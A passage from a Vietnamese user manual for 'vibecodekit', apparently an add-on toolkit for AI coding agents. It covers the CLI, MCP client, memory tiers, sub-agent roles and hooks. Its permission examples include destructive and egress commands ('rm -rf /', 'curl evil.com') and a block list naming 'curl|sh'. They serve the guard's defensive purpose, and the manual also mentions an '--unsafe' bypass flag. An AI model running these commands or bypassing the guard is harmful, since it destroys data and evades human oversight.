    --command npx -y @modelcontextprotocol/server-filesystem /tmp \
    --handshake

# List tools the server advertises (uses initialize + tools/list)
python -m vibecodekit.cli mcp tools filesystem
```

Client tuân thủ MCP protocol version `2024-11-05` với:
- `initialize` → nhận `serverInfo` + `capabilities`
- `notifications/initialized`
- `tools/list`
- `tools/call`

### 12.3 Stdio với timeout có thực (v0.10.2 fix)

Client enforce deadline bằng `selectors`, không chờ vô thời hạn:

```bash
python -m vibecodekit.cli mcp tools slow-server --timeout 2.0
# Nếu server không trả trong 2s → StdioSessionError("timeout after 2.0s")
```

Stderr của server được drain tự động vào bounded 64 KB ring — không bao giờ
deadlock do stderr fill.

### 12.4 Gọi method chưa có typed helper (v0.10.3)

`StdioSession` thêm `request()` + `notify()` là public API để gọi bất kỳ
JSON-RPC method nào mà kit chưa có helper (`logging/setLevel`,
`resources/list`, vendor extensions, v.v.):

```python
from vibecodekit.mcp_client import StdioSession

with StdioSession(["mcp-server-fs"], timeout=5.0) as s:
    s.initialize()
    # request() trả envelope đầy đủ: {"jsonrpc","id","result"|"error"}
    resp = s.request("resources/list", {})
    if "error" in resp:
        raise RuntimeError(resp["error"])
    for r in resp["result"]["resources"]:
        print(r["uri"])

    # notify() không chờ reply (dùng cho `notifications/*`)
    s.notify("notifications/cancelled", {"requestId": 42})
```

`_request()` cũ vẫn work cho backwards-compat; dùng `request()` cho code mới.

---

## 13. Memory hierarchy 3-tier

Kit có 3 scope memory:

| Tier | Vị trí | Khi nào dùng |
|------|--------|-------------|
| `user` | `~/.vibecode/memory/user/` | Preference cá nhân, không share |
| `project` | `<repo>/.vibecode/memory/project/` | Decision của project |
| `team` | shared drive hoặc git | Pattern/template chung |

Normalization: NFKD + lowercase, tương thích tiếng Việt.

### Dùng

```bash
# Ghi nhớ — header + source là metadata tùy chọn.
# Ghi chú: --source bắt buộc là safe basename (không chứa '/'); lý do là
# v0.10 đã đóng lỗ traversal trong memory.add_entry (xem CHANGELOG 0.10).
python -m vibecodekit.cli memory add project \
    "Decision: dùng PostgreSQL 16 thay MySQL" \
    --header "DB choice" --source "adr-0003-postgres.md"

# Truy vấn (hybrid lexical + embedding)
python -m vibecodekit.cli memory retrieve \
    "database được chọn là gì" \
    --tiers project team --top-k 5

# Thống kê hiện trạng
python -m vibecodekit.cli memory stats

# Cấu hình backend embedding (persist trong ~/.vibecode/config.json)
python -m vibecodekit.cli config set-backend hash-256
python -m vibecodekit.cli config show
```

Backend khả dụng mặc định: `hash-256` (pure-Python, offline, reproducible).

Optional: `sbert` (alias `sentence-transformers`, `st`) — auto-register khi
package `sentence-transformers` được cài. Nếu chưa cài mà bạn explicit request
`get_backend("sbert")`, kit sẽ **raise `ValueError`** với hint install (v0.10.3
fix — trước đây silent fallback về hash-256 khiến người dùng nghĩ đang dùng
semantic search thực).

```bash
pip install sentence-transformers    # optional, ~200 MB
vibe config set-backend sentence-transformers   # alias → sbert
```

Chỉ đường `name=None` (resolve từ persisted config) mới fall back âm thầm về
`hash-256` — đây là contract documented (zero-dep out-of-box).

### 13.1 Dashboard HTML snapshot (v0.10.3)

Nếu bạn muốn xem dashboard trong browser thay vì terminal:

```bash
vibe dashboard --root . --html dashboard.html
# Tự mkdir -p parent dir; lỗi permission → JSON {"error","path","detail"} + exit 1
open dashboard.html   # macOS — hoặc xdg-open / Start trên Linux/Windows
```

File HTML tự-chứa (không framework, không network), nhúng full JSON summary
+ CSS tối giản. Full web GUI WebSocket dashboard sẽ ship ở v0.11.

---

## 14. CLI cheatsheet

```bash
# Lifecycle
vibe doctor                       # health check
vibe dashboard                    # runtime dashboard
vibe audit --threshold 0.85       # 87 probes at v0.16.1 (canonical count grows per release)
vibe install <destination>        # cài overlay vào project
vibe compact [--reactive]         # layer 4/5 compaction

# Permission
vibe permission "<command>" [--mode default|auto_safe|accept_edits|yolo]
vibe permission "<command>" --unsafe

# Subagent
vibe subagent spawn <role> <objective>
#   role ∈ {coordinator, scout, builder, qa, security}

# Task runtime (7 kinds)
vibe task start "<shell cmd>" [--timeout N]
vibe task agent --role <r> --objective "<obj>" [--blocks '[...]']
vibe task workflow steps.json
vibe task monitor --server <name> --tool ping --interval 15
vibe task dream
vibe task list [--only running|done|failed]
vibe task status <task_id>
vibe task read <task_id> [--offset N] [--length N]
vibe task kill <task_id>
vibe task stalls

# MCP
vibe mcp list
vibe mcp register <name> --transport stdio --command <argv> --handshake
vibe mcp register <name> --transport inproc --module <dotted.path>
vibe mcp disable <name>
vibe mcp call <name> <tool> [--args-json JSON]
vibe mcp tools <name> [--timeout 10.0]

# Cost / token ledger
vibe ledger summary
vibe ledger reset

# Memory
vibe memory add {user,project,team} "<content>" [--header H] [--source S]
vibe memory retrieve "<query>" [--tiers user project team] [--top-k 8] \
                              [--backend N] [--lexical-weight 0.5]
vibe memory stats

# Approval contract
vibe approval create --title TITLE [--kind permission|diff|elicitation|notification] \
                    [--summary S] [--risk low|medium|high|critical] [--reason R]
vibe approval list
vibe approval respond <approval_id> {allow,deny} [--note N]
vibe approval get <approval_id>
# (Default choice set cho mọi kind là {allow, deny}; caller có thể
#  override qua API `approval_contract.create(options=[...])`.)

# Methodology runners
vibe rri-t <path-to-jsonl>        # RRI-T gate
vibe rri-ux <path-to-jsonl>       # RRI-UX gate
vibe vn-check --flags-json '<json>' | --file <path>

# Config (persist in ~/.vibecode/config.json)
vibe config show
vibe config set-backend <name>
vibe config get <key>

# Query loop
vibe run <plan.json> [--mode default]
```

---

## 15. Troubleshooting

### 15.1 `ModuleNotFoundError: No module named 'vibecodekit'`

Runtime chưa trên PYTHONPATH. Cố định:

```bash
export PYTHONPATH=/path/to/skill/vibecodekit-hybrid-ultra/scripts
```

### 15.2 `audit` báo probe FAIL từ fresh install

Chạy:

```bash
vibe doctor --installed-only
```

Thường thiếu `.vibecode/runtime/` — `vibe install <dest>` sẽ dựng lại.

### 15.3 MCP call hang

v0.10.2 đã enforce timeout qua `selectors`. Nếu bạn vẫn thấy hang:

```bash
# Kiểm tra server stderr
python -c "
from vibecodekit.mcp_client import StdioSession
with StdioSession(['your','server','cmd'], timeout=2.0) as s:
    try: s.initialize()
    except Exception as e: print(e)
    print('stderr tail:', s.stderr_tail()[:500])
"
```

### 15.4 Hook `pre_tool_use.py` block hợp lệ

Hook log vào `.vibecode/hooks/decisions.jsonl`. Xem tại sao:

```bash
tail -20 .vibecode/hooks/decisions.jsonl
```

Nếu false-positive (ví dụ lệnh grep mà hook tưởng là secret scan), thêm
allowlist vào `.vibecode/hooks/allowlist.json`:

```json
{"commands": ["^grep -r 'api_key' tests/"]}
```

### 15.5 RRI-T gate báo `missing_dimensions`

v0.10.2 bắt buộc mỗi dim có ít nhất 1 entry. Thêm case cho dim thiếu hoặc
tạm thời dùng placeholder `{"id":"skip-D4","dimension":"D4","result":"PASS","priority":"P3","notes":"N/A for scope"}` — nhưng **ghi rõ lý do bỏ** trong commit message.

### 15.6 Vietnamese 12-point FAIL

Phân tích từng key trong `missing`:

```bash
vibe vn-check --file vn-flags.json | jq '.missing'
```

Ưu tiên fix theo: `nfkd_diacritics` > `encoding_utf8` > `vnd_formatting` >
`cccd_12_digits` > còn lại.

### 15.7 Out of sync version (skill vs update-package)

Cách nhanh: chạy validator đi kèm (v0.10.3):

```bash
python tools/validate_release.py
# Checks: version sync 7 file + required bundled files + no junk
# Exit 0 → OK; exit 1 → findings liệt kê rõ
```

Hoặc kiểm tay:

```bash
cat VERSION \
    skill/vibecodekit-hybrid-ultra/VERSION \
    claw-code-pack/VERSION \
    claw-code-pack/.claw.json | grep -E 'version|0\.'
# Tất cả phải cùng "0.10.3"
```

Nếu lệch: unzip lại bundle đúng phiên bản.

### 15.8 Session memory không retrieve được

Kiểm tra backend:

```bash
vibe config show
vibe memory retrieve "dummy" --tiers project --top-k 5
```

**v0.10.3 change**: nếu bạn explicit `vibe config set-backend sbert` nhưng
`sentence-transformers` chưa cài → kit raise `ValueError` với hint install
(không còn silent fallback về hash-256). Fix:

```bash
pip install sentence-transformers   # hoặc
vibe config set-backend hash-256     # revert về default
```

Chỉ đường `name=None` (backend không set rõ) mới silent fallback.

### 15.9 Windows — file lock không hoạt động (v0.10.3)

Kit dùng `fcntl.flock` trên POSIX, `msvcrt.locking` trên Windows (helper
`_platform_lock.file_lock`). Nếu cả 2 thiếu (rất hiếm), fallback NO-OP —
single-process OK, multi-process có thể race.

Production muốn detect silent race trên Windows:

```bash
# PowerShell
$env:VIBECODE_STRICT_LOCK = "1"
python -m vibecodekit.cli task start my-plan.json
# Nếu msvcrt.locking fail cả retry → raise RuntimeError
```

---

---

## 19. CLI reference — 31 subcommand

> Pre-condition: `PYTHONPATH=$PWD/scripts` (hoặc đã cài runtime qua
> `pip install -e .`). Tất cả subcommand chạy bằng:
>
> ```bash
> python -m vibecodekit.cli <subcommand> [args...]
> # alias: `vibe <subcommand>` nếu đã `pip install`
> ```
>
> Mỗi subcommand đều trả về JSON envelope ổn định để dễ pipe vào `jq`
> hoặc CI step.  Failure exit code = 1, success exit code = 0 trừ khi
> nói rõ.

### Lifecycle / health

#### 19.1 `vibe doctor`

Kiểm tra layout overlay đã wire đầy đủ chưa.  Phát hiện ngay 3 trường hợp:

1. **Project bình thường** — overlay đã được install (`.claw.json`,
   `CLAUDE.md`, `.claude/commands`, `ai-rules/vibecodekit/` đều ở repo
   root).
2. **Skill repo source tree** (mới ở v0.16.1) — overlay nằm dưới
   `update-package/` và `scripts/vibecodekit/`; envelope sẽ có
   `"skill_repo": true`.
3. **Placeholder install** — `ai-rules/vibecodekit/` tồn tại nhưng
   thiếu `scripts/`; doctor cảnh báo cần chạy `vibe install`.

```bash
vibe doctor                # JSON envelope, exit 0 nếu lành
vibe doctor --installed-only   # exit 1 nếu placeholder/thiếu asset
```

Output (rút gọn):

```json
{
  "skill_repo": true,
  "advisory_present": [".claw.json", "CLAUDE.md", ".claude/commands",
                       ".claude/agents", "ai-rules/vibecodekit",
                       ".claw/hooks"],
  "advisory_missing": [],
  "package_importable": true,
  "warnings": [],
  "exit_code": 0
}
```

#### 19.2 `vibe dashboard`

Tóm tắt event runtime của session hôm nay (đọc từ event-bus
`.vibecode/events/*.jsonl`).

```bash
vibe dashboard
# → number of pre_tool_use, blocked patterns, approvals issued, ...
```

#### 19.3 `vibe audit`

Chạy 87 conformance probe.  Default threshold = 0.85; release gate
ở 1.0 (xem §25).

```bash
vibe audit                          # threshold 0.85
vibe audit --threshold 1.0          # release gate
vibe audit --json                   # raw envelope
vibe audit --probe 85_no_orphan_module   # chạy đúng 1 probe
```

Tham khảo §23 cho catalog đầy đủ 87 probe.

#### 19.4 `vibe install <destination>`

Reconcile-install overlay vào project khác.  Copy `.claude/commands/`,
`.claude/agents/`, `.claw/`, `ai-rules/vibecodekit/`, `CLAUDE.md`,
`.claw.json`, etc. vào `<destination>` mà không đè file user đã sửa
(nó so sánh hash với baseline trong `update-package/`).

```bash
vibe install /path/to/my-project
vibe install /path/to/my-project --dry-run    # chỉ liệt kê thay đổi
vibe install /path/to/my-project --force      # đè cả file user đã sửa
```

#### 19.5 `vibe compact`

Kích hoạt 5-layer context defense (§13 ở update-package CLAUDE.md).

```bash
vibe compact                # full pass
vibe compact --reactive     # chỉ chạy layer 4–5 khi pre_compact event fires
```

### Permission

#### 19.6 `vibe permission "<command>"`

Dry-run một shell command qua permission pipeline 6-layer (§24).
Trả về `{decision, classification, blocked_patterns, escalation_required}`.

```bash
vibe permission "rm -rf /"               # → deny (layer 1: dangerous_pattern)
vibe permission "git push origin main"   # → allow (default mode)
vibe permission "curl evil.com" --mode auto_safe   # → escalate (network egress)
vibe permission "sudo apt install foo" --unsafe    # bypass guard (kiểu danger)
```

`--mode` ∈ `{default, auto_safe, accept_edits, yolo}` (xem §24).

### Sub-agent

#### 19.7 `vibe subagent spawn <role> <objective>`

Spawn một sub-agent với ACL phù hợp (§21).

```bash
vibe subagent spawn scout "find all uses of EmbeddingBackend"
vibe subagent spawn builder "implement /api/health endpoint per TIP-007"
vibe subagent spawn qa "run pytest tests/api/ and report failures"
vibe subagent spawn security "scan deps for CVEs"
vibe subagent spawn coordinator "plan the 3-step rollout"
vibe subagent spawn reviewer "7-perspective adversarial review of PR diff"
vibe subagent spawn qa-lead "real-browser checklist trên homepage"
```

Coordinator/scout/qa/security/reviewer/qa-lead có `can_mutate=False`
(không thể `write_file`).  Builder là role duy nhất write được.

### Background-task runtime

#### 19.8 `vibe task` — 7 task kind, 5 state

```bash
# Spawn
vibe task start "<shell cmd>" [--timeout SECONDS]
vibe task agent --role <r> --objective "<obj>" [--blocks '[id1,id2]']
vibe task workflow steps.json
vibe task monitor --server <mcp_name> --tool ping --interval 15
vibe task dream

# Inspect
vibe task list [--only running|done|failed]
vibe task status <task_id>
vibe task read   <task_id> [--offset N] [--length N]
vibe task stalls

# Control
vibe task kill   <task_id>
```

Trạng thái: `pending` → `running` → (`done` | `failed` | `stalled`).
Task đặt tag `dream` chạy 4 phase (search → reflect → propose → critique).

### MCP (Model Context Protocol)

#### 19.9 `vibe mcp` — register/list/call/tools/disable

```bash
vibe mcp list

# stdio transport (process-per-server)
vibe mcp register myserver --transport stdio \
       --command python -m my.mcp.server --handshake

# inproc transport (Python module trong process)
vibe mcp register selfcheck --transport inproc \
       --module vibecodekit.mcp_servers.selfcheck

vibe mcp tools selfcheck                # list tools của server
vibe mcp call  selfcheck ping           # gọi tool
vibe mcp call  selfcheck echo --args-json '{"text":"hi"}'
vibe mcp disable myserver
```

Bundled sample server (`vibecodekit.mcp_servers.selfcheck`) export 3
tool: `ping`, `echo`, `now`.  Probe #20 verify MCP adapter; probe #29
verify stdio handshake; probe #39 verify full handshake.

### Cost / token ledger

#### 19.10 `vibe ledger {summary, reset}`

```bash
vibe ledger summary           # tổng token + cost theo provider
vibe ledger reset             # clear ledger (sau khi đã ship release)
```

Ledger được persist ở `.vibecode/ledger/`.

### Memory (3-tier)

#### 19.11 `vibe memory` — add / retrieve / stats / writeback

```bash
# Add
vibe memory add user    "Prefer pnpm over npm for new projects"
vibe memory add project "Test runner: pytest -p no:cacheprovider"
vibe memory add team    "Release cadence: every 2 weeks"

# Retrieve (hybrid lexical + embedding)
vibe memory retrieve "test runner" --tiers project team --top-k 5
vibe memory retrieve "deploy" --backend hash-256 --lexical-weight 0.7

# Inspect
vibe memory stats             # số entry per tier
vibe memory writeback nest    # nest team memory vào CLAUDE.md
vibe memory writeback auto    # auto-writeback bật theo policy
```

Tiers (§13):
- `user`    — `~/.vibecode/memory/`           (cross-project)
- `project` — `.vibecode/memory/`             (repo-local)
- `team`    — `.vibecode/memory/team/`        (commit vào repo)

### Approval contract

#### 19.12 `vibe approval` — list / create / get / respond

```bash
vibe approval list

vibe approval create --title "Deploy to prod" --kind permission \
       --summary "rollout v1.2.3" --risk medium --reason "fix CVE-2024-X"

vibe approval get appr-1a2b3c4d5e6f7890
vibe approval respond appr-1a2b3c4d5e6f7890 allow --note "lgtm"
vibe approval respond appr-1a2b3c4d5e6f7890 deny  --note "wait for QA"
```

Choices default = `{allow, deny}`; caller có thể override qua API
`approval_contract.create(options=[...])`.  Probe #26 verify contract.

### Methodology runners

#### 19.13 `vibe rri-t <jsonl>`, `vibe rri-ux <jsonl>`, `vibe vn-check`

```bash
vibe rri-t  qa_results.jsonl       # 5 personas × 7 dims × 8 axes
vibe rri-ux ux_results.jsonl       # Flow Physics 7 dims × 8 axes
vibe vn-check --file flags.json    # 12-point Vietnamese checklist
vibe vn-check --flags-json '{"vn_error_translator":true,"vn_faker":true,...}'
```

Gate FAIL nếu thiếu key bắt buộc hoặc dimension < 70 %.

### Config

#### 19.14 `vibe config` — show / set-backend / get

Persistence: `~/.vibecode/config.json`.

```bash
vibe config show
vibe config set-backend sentence-transformers   # dùng embedding model
vibe config set-backend hash-256                # offline default
vibe config get embedding.backend
```

### Intent + Pipeline router (mới ở v0.16.0a0+)

#### 19.15 `vibe intent classify "<prose>"`

Classify prose → một hoặc nhiều intent (BUILD, SCAN, RRI, VCK_REVIEW,
VCK_CSO, VCK_PIPELINE, …).

```bash
vibe intent classify "review my code for security"
# → intents=['VCK_REVIEW'], confidence=0.77

vibe intent classify "build the whole thing"
# → intents=['VCK_PIPELINE'], confidence=0.66   # (v0.16.1 adds this)
```

#### 19.16 `vibe pipeline route "<prose>"`, `vibe pipeline list`

Master router gọi `/vck-pipeline` → 1 trong 3 pipeline (A=PROJECT
CREATION, B=FEATURE DEV, C=CODE & SECURITY).

```bash
vibe pipeline list
vibe pipeline route "scan my codebase for security issues"
# → pipeline=C, confidence=0.91
```

### Scaffold + Ship

#### 19.17 `vibe scaffold {list, preview, apply, history, rollback}`

10 preset × 3 stack = 30 starter project (probe #43, #45).

```bash
vibe scaffold list
vibe scaffold preview --preset saas --stack nextjs
vibe scaffold apply   --preset saas --stack nextjs --target ./my-app
vibe scaffold history
vibe scaffold rollback <history_id>
```

Preset: `saas`, `portfolio`, `docs`, `dashboard`, `landing`, `blog`,
`ecommerce`, `internal-tools`, `auth-only`.  Stack: `nextjs`,
`fastapi`, `astro`.  Seed `.vibecode/` directory (probe #83).

#### 19.18 `vibe ship`

Deploy tới 1 trong 7 target: Vercel, Docker, VPS, Cloudflare Pages,
Railway, Fly.io, Render (xem §16.3).

```bash
vibe ship --target vercel
vibe ship --target docker --image-tag myapp:0.1.0
vibe ship --target fly    --app-name my-app --region sin
```

### Manifest + Refine + Verify + Anti-patterns + Module + Context

#### 19.19 `vibe manifest {emit, show}`

```bash
vibe manifest show                     # in JSON manifest
vibe manifest emit > manifest.json     # ghi file
```

Manifest gồm metadata: 42 slash commands, 7 agents, 33 hook events,
87 probes, version, build hash.

#### 19.20 `vibe refine`

Refine ticket (BƯỚC 8/8 của VIBECODE-MASTER) — open template + classify
diff theo v5 refine envelope.  Probe #40 verify boundary classifier.

```bash
vibe refine --diff-json diff.json
vibe refine --diff-from HEAD~1
```

Output: `{tier, requires_vision, reasons, signals}`.

#### 19.21 `vibe verify`

Adversarial QA gate cho TIP đã build xong.  Tự gọi RRI-T (testing) +
RRI-UX (nếu có UI) + VN-check (nếu VN scope).

```bash
vibe verify --tip TIP-007.json
```

Probe #41 verify req coverage.

#### 19.22 `vibe anti-patterns`

Liệt kê 12 SaaS anti-pattern (probe #42) — dùng làm checklist trong
review.

```bash
vibe anti-patterns
vibe anti-patterns --json
```

#### 19.23 `vibe module {plan, run}` — Pattern F

Add 1 module mới vào codebase đã tồn tại theo nguyên tắc reuse-max /
build-min (probe #44).

```bash
vibe module --name billing --spec "Stripe checkout + webhook"
```

Output: kế hoạch + reuse inventory + acceptance criteria.

#### 19.24 `vibe context {show, switch}`

Quản lý layout context (cwd, active branch, active TIP).

#### 19.25 `vibe activate`

Activate gstack-port modules theo cheat-sheet §18.  Đặt feature flag
trong `.claw.json`.

```bash
vibe activate browser              # bật browser daemon
vibe activate session-ledger       # bật cost ledger
vibe activate team-mode            # bật team mode (probe #75/#78)
```

### Team / Learn

#### 19.26 `vibe team {init, status}`

Team mode bootstrap (`.vibecode/team.json`) — probe #75 + #78.

```bash
vibe team init    # tạo .vibecode/team.json
vibe team status  # ai đang on-call, learnings count
```

#### 19.27 `vibe learn`

Capture 1 learning vào `.vibecode/learnings.jsonl` (probe #74, #82).

```bash
vibe learn --scope team "pnpm faster than npm trong CI"
vibe learn --scope project "test runner = pytest -p no:cacheprovider"
```

`session_start` hook auto-inject learnings 7 ngày gần nhất (probe #82).

### Discover + Run

#### 19.28 `vibe discover`

Dynamic skill discovery — quét `.claude/commands/` ở project hiện tại
+ skill bundle để build manifest cho IDE hỗ trợ tab-completion.

```bash
vibe discover
vibe discover --json
```

Probe #13.

#### 19.29 `vibe run <plan.json>`

Execute plan qua query-loop runtime (DAG of TIPs với dependency
resolution + retry).

```bash
vibe run my-plan.json
vibe run my-plan.json --mode default      # permission mode
vibe run my-plan.json --mode accept_edits # auto-accept file edits
```

Probe #1 (async generator loop).

### Pipeline (master)

#### 19.30 `vibe pipeline route "<prose>"` (đã list ở §19.16)

#### 19.31 Hidden subcommand: `vibe-doctor` (legacy alias)

Một số shell wrapper script trong update-package vẫn gọi `vibe-doctor`
như legacy alias. Trong v0.16.1 cả hai dạng đều hoạt động.

---

## 20. Slash command reference — 42 lệnh

> Tất cả slash command nằm dưới `.claude/commands/`.  Mỗi `.md` file
> có frontmatter `name`, `description`, `version`, `agent`,
> `allowed-tools`, đôi khi có `triggers` (cho master router
> `/vck-pipeline`).

### 20.1 Mặt cắt thống kê

| Loại | Count | Notes |
|---|---|---|
| `/vibe-*` lifecycle | 25 | core methodology + runtime |
| `/vibe` master | 1 | single-prompt router (F4) |
| `/vck-*` extension | 16 | code review / QA / pipeline ops |
| **Tổng** | **42** | xác định bởi probe `63_vck_commands_present` + count `update-package/.claude/commands/` |

### 20.2 Lifecycle (`/vibe-*` core 25 + master 1)

| Slash | Agent | Mô tả |
|---|---|---|
| `/vibe` | (router) | master single-prompt router (F4) — phân loại prose vào 1 trong 25 `/vibe-*` |
| `/vibe-scan` | scout | scan repo + docs (BƯỚC 1) |
| `/vibe-rri` | — | Reverse Requirements Interview, 5 personas (BƯỚC 2) |
| `/vibe-vision` | — | define goals/KPI/non-goals (BƯỚC 3) |
| `/vibe-blueprint` | coordinator | architecture + data + interfaces (BƯỚC 4) |
| `/vibe-tip` | — | mở Task Instruction Pack template |
| `/vibe-task` | — | DAG + agent/workflow/monitor/dream tasks (BƯỚC 5) |
| `/vibe-subagent` | — | spawn agent (xem §21) (BƯỚC 6) |
| `/vibe-run` | — | execute query-loop plan |
| `/vibe-verify` | — | adversarial QA gate (BƯỚC 7) |
| `/vibe-complete` | — | completion report + quality gate |
| `/vibe-refine` | — | refine ticket (BƯỚC 8/8) + boundary classifier |
| `/vibe-module` | builder | Pattern F: add module reuse-max/build-min |
| `/vibe-rri-t` | — | testing release gate (5×7×8) |
| `/vibe-rri-ux` | — | UX release gate (Flow Physics 7×8) |
| `/vibe-rri-ui` | — | UI design pipeline (4-phase) |
| `/vibe-memory` | — | 3-tier memory + auto-maintain CLAUDE.md |
| `/vibe-approval` | — | structured approval / elicitation |
| `/vibe-permission` | — | dry-run command qua permission pipeline |
| `/vibe-compact` | — | 5-layer context defense |
| `/vibe-doctor` | — | health check |
| `/vibe-dashboard` | — | summarise today's events |
| `/vibe-audit` | security | 87-probe conformance audit |
| `/vibe-install` | — | reconcile-install overlay vào project mới |
| `/vibe-scaffold` | builder | scaffold preset (10 × 3 = 30) |
| `/vibe-ship` | — | deploy 7 target |

### 20.3 Extension (`/vck-*` × 16)

VCK-HU thêm các command focus vào code review / QA / ops, agnostic của
methodology core.

| Slash | Agent | Mô tả |
|---|---|---|
| `/vck-pipeline` | coordinator | master router cho 3 pipeline (A=create, B=feature, C=code/security) |
| `/vck-ship` | — | orchestrator: test → review → commit → push → PR |
| `/vck-canary` | — | post-deploy canary 30 phút (health/error/latency) |
| `/vck-cso` | — | Chief Security Officer audit (OWASP Top 10 + STRIDE + supply-chain, VN-first) |
| `/vck-review` | — | adversarial 7-specialist code review (architect/security/perf/a11y/ux/dx/risk) |
| `/vck-eng-review` | — | engineering-mode review (lock arch + ASCII diagram + state-machine) |
| `/vck-ceo-review` | — | CEO-mode review (4 mode: SCOPE EXPANSION/SELECTIVE/HOLD/REDUCTION) |
| `/vck-design-consultation` | — | build design system from scratch (tokens → components → patterns → flows) |
| `/vck-design-review` | — | audit shipped UI vs design system + atomic fix loop |
| `/vck-investigate` | — | root-cause debug (NO-FIX-WITHOUT-INVESTIGATION) |
| `/vck-learn` | — | capture 1 learning vào `learnings.jsonl` |
| `/vck-office-hours` | — | YC-style product interrogation (6 forcing Qs) |
| `/vck-qa` | — | real-browser QA sub-second (Chromium daemon) |
| `/vck-qa-only` | — | QA-only checklist (CI / pre-merge gate; no fix loop) |
| `/vck-retro` | — | weekly retro (7 ngày learnings → keep/stop/try → 3 commit action) |
| `/vck-second-opinion` | — | second-opinion review (gọi Codex / Gemini / Ollama) |

### 20.4 Trigger phrases cho `/vck-pipeline`

Master router `/vck-pipeline` có frontmatter `triggers:` để IDE/Claude
Code biết khi prose tự nhiên nên dispatch.  Ở v0.16.1, danh sách
trigger được pin ngược về `intent_router.VCK_PIPELINE` để 3 router
(Claude Code dispatch, IntentRouter prose-mode, PipelineRouter EN/VN
prose) đồng bộ:

```
pipeline · pipeline đầy đủ · pipeline day du · vck pipeline ·
chọn pipeline · chon pipeline · master pipeline · pipeline router ·
full check · go through pipeline · all gates · end to end · e2e check ·
build the whole thing · set everything up
```

(2 phrase cuối là gap fix mới nhất ở v0.16.1 — xem CHANGELOG entry.)

### 20.5 Agent binding (probe #52, #66)

Slash command có `agent:` trong frontmatter sẽ tự động spawn đúng vai:

```
vibe-scan       → scout
vibe-blueprint  → coordinator
vibe-scaffold   → builder
vibe-module     → builder
vibe-audit      → security
vck-pipeline    → coordinator
```

Các slash command còn lại không pin agent, dependency là context-free.

### 20.6 Context wiring (probe #51, #36)

Mỗi slash command file luôn import `.claude/contexts/`.md thư mục context
share (e.g., `_v5-refine.md`, `_methodology-overview.md`).  Probe #51
verify wiring; probe #53 verify skill paths.

---

## 21. Sub-agent reference — 7 vai

> ACL được enforce ở `subagent_runtime.PROFILES`.  Coordinator,
> scout, qa, security, reviewer, qa-lead đều có `can_mutate=False`
> (không gọi được `write_file`/`append_file`).

### 21.1 ACL table

| Vai | `can_mutate` | `permission_mode` | Tool whitelist | Use case |
|---|:---:|---|---|---|
| **coordinator** | ✗ | `plan` | read-only + task-control + approvals | planning + orchestration; spawn builder/scout/qa khác |
| **scout** | ✗ | `plan` | read-only + `run_command` (read-only verify) | grep/glob/read repo, find references |
| **builder** | ✓ | `default` | full read + `run_command` + `write_file` + `append_file` + memory-write | implement TIP đã được approved; high-risk bubble-escalates |
| **qa** | ✗ | `plan` | read-only + `run_command` | run tests, verify gate, đọc log |
| **security** | ✗ | `plan` | read-only + `run_command` (read-only) | OWASP / STRIDE audit, redact log |
| **reviewer** | ✗ | `plan` | read-only + `run_command` | adversarial 7-specialist review (architect/security/perf/a11y/ux/dx/risk) |
| **qa-lead** | ✗ | `plan` | read-only + `run_command` | real-browser checklist, VN-12 gate, đề xuất fix loop |

### 21.2 Tool ACL (chi tiết per role)

```
COMMON_READONLY = [
  list_files, read_file, grep, glob,
  task_status, task_read, task_notifications,
  mcp_list, memory_retrieve, memory_stats, approval_list,
]

coordinator = COMMON_READONLY + [task_start, task_kill,
                                 approval_create, approval_respond]
scout       = COMMON_READONLY + [run_command]
qa          = COMMON_READONLY + [run_command]
security    = COMMON_READONLY + [run_command]
reviewer    = COMMON_READONLY + [run_command]
qa-lead     = COMMON_READONLY + [run_command]
builder     = COMMON_READONLY + [task_start, task_kill, memory_add,
                                 approval_create, approval_respond,
                                 run_command, write_file, append_file]
```

### 21.3 Khi nào dùng vai nào

| Tình huống | Vai phù hợp |
|---|---|
| "Hãy tìm tất cả nơi gọi function X" | **scout** |
| "Hãy implement endpoint POST /api/v1/users theo TIP-007" | **builder** |
| "Plan rollout 3 PR cho feature billing" | **coordinator** |
| "Run pytest và báo failures" | **qa** |
| "Audit deps cho CVE" | **security** |
| "Adversarial review PR diff" | **reviewer** |
| "Real-browser QA checklist trên homepage" | **qa-lead** |

### 21.4 Probe binding

- Probe `07_coordinator_restriction` — confirm coordinator **không**
  có `write_file` trong tool whitelist.
- Probe `52_command_agent_binding` — confirm slash command frontmatter
  `agent:` tồn tại trong PROFILES.
- Probe `66_vck_command_agent_binding` — confirm `/vck-*` cũng tuân
  thủ binding.

### 21.5 Spawn syntax

CLI:
```bash
vibe subagent spawn <role> "<objective>"
```

Slash command (Claude Code / Claw Code):
```
/vibe-subagent <role> <objective>
```

Khi spawn, runtime tạo task ID `agent-<8hex>`, chuyển permission
context, gọi sub-agent với tool whitelist tương ứng.  Sub-agent có
quyền spawn task con (qua `task_start`) nếu role cho phép.

---

## 22. Hook event reference — 33 event + 4 script

### 22.1 33 lifecycle event (`hook_interceptor.SUPPORTED_EVENTS`)

Chia 9 nhóm:

| Nhóm | Count | Events |
|---|:---:|---|
| Tool | 3 | `pre_tool_use`, `post_tool_use`, `post_tool_use_failure` |
| Permission | 2 | `permission_request`, `permission_denied` |
| Session | 3 | `session_start`, `session_end`, `setup` |
| Agent | 3 | `subagent_start`, `subagent_stop`, `teammate_idle` |
| Task | 4 | `task_created`, `task_completed`, `stop`, `stop_failure` |
| Context | 3 | `pre_compact`, `post_compact`, `notification` |
| Filesystem | 4 | `file_changed`, `cwd_changed`, `worktree_create`, `worktree_remove` |
| UI / Config | 5 | `elicitation`, `elicitation_result`, `config_change`, `instructions_loaded`, `user_prompt_submit` |
| Query legacy | 6 | `pre_query`, `post_query`, `pre_tip`, `post_completion`, `pre_release`, `pre_release_gate` |

Probe `22_26_hook_events` pin 26 event canonical từ "Anatomy of an
Agentic OS" Chapter 10.3; 7 event extra (post_tool_use_failure,
stop_failure, post_compact, worktree_*, pre_release*) là forward-compat
addition và không break probe.

### 22.2 4 hook script (`update-package/.claw/hooks/`)

| Script | Trigger event | Effect |
|---|---|---|
| `pre_tool_use.py` | `pre_tool_use` | block 40+ dangerous pattern (rm -rf, curl|sh, sudo apt remove, ...) |
| `post_tool_use.py` | `post_tool_use` | log + redact secret; **drive `auto_commit_hook` khi `VIBECODE_AUTOCOMMIT=1`** (wired ở v0.16.0a0) |
| `pre_compact.py` | `pre_compact` | run trước layer-4/5 compaction |
| `session_start.py` | `session_start` | init runtime, banner, **inject 7-day learnings** (probe #82) |

### 22.3 Auto-commit hook (opt-in, v0.16.0a0+)

`post_tool_use.py` driven `auto_commit_hook` mỗi khi
